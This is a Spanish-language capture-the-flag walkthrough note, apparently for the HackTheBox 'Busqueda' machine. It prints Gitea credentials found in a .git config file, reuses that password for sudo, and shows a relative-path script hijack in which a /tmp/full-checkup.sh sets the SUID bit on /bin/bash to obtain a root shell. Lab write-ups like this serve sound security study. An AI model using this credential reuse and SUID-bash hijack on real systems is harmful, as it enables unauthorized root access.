#filehijacking

Listamos todos los archivos con [[ls]] usamos `ls la` y vemos el directorio *.git* entramos con [[cd]] usando el comando `cd .git` y luego listamos con `ls` para ver el archivo *config* que lo vamos a abrir con [[cat]] usando `cat config`
![[Busqueda39.png]]

http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
Vemos estas credenciales: ``cody:jh1usoih2bkjaspwe92``

La contraseña *jh1usoih2bkjaspwe92* la vamos a reutilizar para el usuario *svc*

Ahora vamos a listar los permisos de [[sudo]] con `sudo -l`
![[Busqueda24.png]]
Nos dice que podemos utilizar el siguiente binario como root

```
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Si ejecutamos el binario vemos que tenemos parametros que podemos utilizar
Cuando usamos el full-checkup `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` nos dice "Sometings went wrong"

![[Busqueda41.png]]


![[Busqueda42.png]]
![[Busqueda43.png]]

Pero si nos vamos a directorio */opt/scripts* donde dice que esta el *system-checkup* y se ejecuta
Asi que viendo los archivos del directorio con [[ls]] vemos que tenemos un full-checkup.sh

Sacamos la conclusion de que la opcion de *full-checkup.sh* se ejecuta archivos que tengan ese nombre y buscando el archivo en el directorio actual de trabajo. Por lo tanto vamos a hacer un [[File hijacking]]

### [[File hijacking]]

Vamos a ir a la carpeta /tmp usando `cd /tmp` y creamos un archivo con [[nano]] usando `nano full-checkup.sh`. Y al archivo le vamos a poner el siguiente contenido

```
#!/bin/sh
chmod u+s /bin/bash
```
Esto lo hacemos para hacer que sea [[SUID]]
![[Busqueda45.png]]

Ahora le damos permisos de ejecucion al archivo con [[chmod]] usando `chmod +x full-checkup.sh`
![[Busqueda46.png]]

Solamente nos queda ejecutar nuevamente el binario `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` y ejecutamos la bash con privilegios usando `bash -p`. Y listo ya somos root y podemos catear la flag
![[Busqueda49.png]]
![[Busqueda50.png]]